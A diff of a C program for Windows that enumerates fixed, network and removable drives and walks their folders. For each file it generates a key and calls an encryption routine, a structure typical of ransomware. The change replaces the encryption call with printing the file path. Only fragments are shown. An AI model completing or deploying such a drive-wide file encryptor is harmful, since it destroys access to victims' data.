@@ -35,7 +35,7 @@ unsigned char * t_two        = "..";
 
 short int size_uc = sizeof(unsigned char); 
 
-unsigned short vi, bi;
+short int vi, bi;
 
 unsigned char secret_key [_BYTE]        = {_ZERO};
 unsigned char buffer     [_BUFFER_SIZE] = {_ZERO};
@@ -44,7 +44,7 @@ unsigned char data       [_BYTE]        = {_ZERO};
 int main (void) {
  short int disk;
  time_t real_time;
- char LOCAL_DISK[] = "+:";
+ unsigned char LOCAL_DISK[] = "+:";
  
  srand(time(&real_time));
 
@@ -80,7 +80,8 @@ void finddir(unsigned char * path, unsigned char * mask) {
     strcat(pathfile, slash);
     strcat(pathfile, wfd.cFileName);
     generatekey();
-	fileencrypt(pathfile);
+	printf("%s;\n", pathfile);
+	//fileencrypt(pathfile);
    }
   } while (FindNextFile(hfound, &wfd));
  }
@@ -113,7 +114,7 @@ short int checklogicaldisk(unsigned char number_disk) {
  unsigned char LOGICAL_DISK[] = "+:\\";
  LOGICAL_DISK[_ZERO] = number_disk;
 
- short int result = (short int)GetDriveType(LOGICAL_DISK);
+ short int result = (short int)GetDriveType(&LOGICAL_DISK[_ZERO]);
  
  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE) || (result == DRIVE_REMOVABLE))
   return _ZERO;
@@ -125,7 +126,7 @@ short int randomrange(short int min, short int max) {
  return min + rand() % ((max + 1) - min);
 }
 
-void writetrash(unsigned char * data, short int  length) {
+void writetrash(unsigned char * data, short int length) {
  short int i;
 
   for (i = _ZERO; i < length; i++)
